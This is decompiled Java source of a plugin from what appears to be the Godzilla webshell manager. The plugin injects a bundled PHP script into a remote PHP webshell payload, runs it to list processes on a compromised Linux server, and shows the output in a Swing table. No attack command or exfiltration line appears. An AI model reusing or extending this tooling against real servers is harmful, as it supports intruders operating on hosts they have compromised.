/*     */ package shells.plugins.php;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.DataView;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.InputStream;
/*     */ import java.util.Vector;
/*     */ import java.util.concurrent.CopyOnWriteArrayList;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ @PluginAnnotation(payloadName = "PhpDynamicPayload", Name = "PPs", DisplayName = "进程详情")
/*     */ public class PPs
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "Ps";
/*  30 */   private static final Vector COLUMNS_VECTOR = new Vector(new CopyOnWriteArrayList((Object[])new String[] { "UID", "PID", "PPID", "STIME", "TTY", "TIME", "CMD" }));
/*     */   
/*     */   private final JPanel panel;
/*     */   
/*     */   private final DataView dataView;
/*     */   
/*     */   private final JButton scanButton;
/*     */   
/*     */   private boolean loadState;
/*     */   
/*     */   private final JSplitPane portScanSplitPane;
/*     */   private ShellEntity shellEntity;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   
/*     */   public PPs() {
/*  46 */     this.panel = new JPanel(new BorderLayout());
/*     */ 
/*     */     
/*  49 */     this.scanButton = new JButton("ps");
/*  50 */     this.dataView = new DataView(null, COLUMNS_VECTOR, -1, -1);
/*  51 */     this.portScanSplitPane = new JSplitPane();
/*     */ 
/*     */     
/*  54 */     this.portScanSplitPane.setOrientation(0);
/*  55 */     this.portScanSplitPane.setDividerSize(0);
/*     */     
/*  57 */     JPanel topPanel = new JPanel();
/*  58 */     topPanel.add(this.scanButton);
/*     */     
/*  60 */     this.portScanSplitPane.setTopComponent(topPanel);
/*  61 */     this.portScanSplitPane.setBottomComponent(new JScrollPane((Component)this.dataView));
/*     */ 
/*     */     
/*  64 */     this.panel.add(this.portScanSplitPane);
/*     */   }
/*     */   
/*     */   private void load() {
/*  68 */     if (!this.loadState) {
/*     */       try {
/*  70 */         InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.php", new Object[] { "Ps" }));
/*  71 */         byte[] data = functions.readInputStream(inputStream);
/*  72 */         inputStream.close();
/*  73 */         if (this.loadState = this.payload.include("Ps", data)) {
/*  74 */           this.loadState = true;
/*  75 */           Log.log("Load success", new Object[0]);
/*     */         } else {
/*  77 */           Log.log("Load fail", new Object[0]);
/*     */         } 
/*  79 */       } catch (Exception e) {
/*  80 */         Log.error(e);
/*     */       } 
/*     */     }
/*     */   }
/*     */   
/*     */   private void scanButtonClick(ActionEvent actionEvent) {
/*  86 */     if (!this.payload.isWindows()) {
/*  87 */       load();
/*  88 */       byte[] result = this.payload.evalFunc("Ps", "run", new ReqParameter());
/*  89 */       String resultString = this.encoding.Decoding(result);
/*  90 */       formatResult(resultString);
/*     */     } else {
/*  92 */       GOptionPane.showMessageDialog((Component)this.shellEntity.getFrame(), "仅支持Linux", "警告", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   private void formatResult(String resultString) {
/*  97 */     String[] lines = resultString.split("\n");
/*  98 */     String[] infos = null;
/*  99 */     Vector<Vector<String>> rowsVector = new Vector();
/* 100 */     Vector<String> columnVector = null;
/* 101 */     Log.log(resultString, new Object[0]);
/* 102 */     for (String line : lines) {
/*     */       try {
/* 104 */         infos = line.trim().split("\t");
/* 105 */         Vector<String> oneRowVector = new Vector();
/* 106 */         for (String info : infos) {
/* 107 */           oneRowVector.add(info.trim());
/*     */         }
/* 109 */         if (columnVector == null) {
/* 110 */           columnVector = oneRowVector;
/*     */         } else {
/* 112 */           int index = oneRowVector.size() - 1;
/* 113 */           String v = oneRowVector.get(index);
/* 114 */           oneRowVector.set(index, new String(functions.base64Decode(v)));
/* 115 */           rowsVector.add(oneRowVector);
/*     */         } 
/* 117 */       } catch (Exception e) {
/* 118 */         Log.error(line);
/*     */       } 
/*     */     } 
/* 121 */     this.dataView.getModel().setColumnIdentifiers(columnVector);
/* 122 */     this.dataView.AddRows(rowsVector);
/*     */   }
/*     */ 
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 127 */     this.shellEntity = shellEntity;
/* 128 */     this.payload = this.shellEntity.getPayloadModule();
/* 129 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 130 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/* 135 */     if (!this.payload.isWindows()) {
/* 136 */       return this.panel;
/*     */     }
/* 138 */     return null;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\php\PPs.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */